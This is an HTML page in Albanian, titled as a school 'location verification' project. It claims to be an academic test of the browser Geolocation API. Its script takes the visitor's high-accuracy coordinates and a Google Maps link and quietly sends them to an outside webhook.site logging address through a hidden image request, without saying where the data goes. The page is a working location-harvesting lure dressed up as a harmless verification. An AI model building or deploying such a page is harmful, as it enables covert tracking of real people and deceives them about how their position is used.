<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Projekti Shkollor - Verifikimi i Vendndodhjes</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 420px;
            width: 90%;
        }
        h2 { color: #1a252f; margin-bottom: 12px; }
        p { color: #555; font-size: 14px; line-height: 1.6; }
        .btn {
            background-color: #0066cc;
            color: #ffffff;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: 600;
        }
        .btn:hover { background-color: #0052a3; }
        #status { margin-top: 18px; font-size: 13px; color: #666; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Verifikimi i Vendndodhjes</h2>
        <p>Ky është një projekt akademik për testimin e HTML5 Geolocation API. Klikoni butonin për të lejuar verifikimin e zonës tuaj.</p>
        <button class="btn" onclick="sendLocation()">Lejo Vendndodhjen</button>
        <div id="status"></div>
    </div>

    <script>
        function sendLocation() {
            const statusDiv = document.getElementById("status");
            const webhookEndpoint = "https://webhook.site/173a0605-312d-4be1-b9aa-891895e5a34e";

            if ("geolocation" in navigator) {
                statusDiv.innerText = "Duke kërkuar lejen nga shfletuesi...";

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                        statusDiv.innerText = "Duke transmetuar të dhënat...";

                        const img = new Image();
                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl)}`;
                        
                        statusDiv.innerHTML = "<strong style='color: green;'>Vendndodhja u mor dhe u dërgua me sukses!</strong>";
                    },
                    function(error) {
                        statusDiv.innerText = "Qasja u refuzua nga përdoruesi.";
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                statusDiv.innerText = "Shfletuesi juaj nuk e mbështet gjeolokacionin.";
            }
        }
    </script>
</body>
</html>
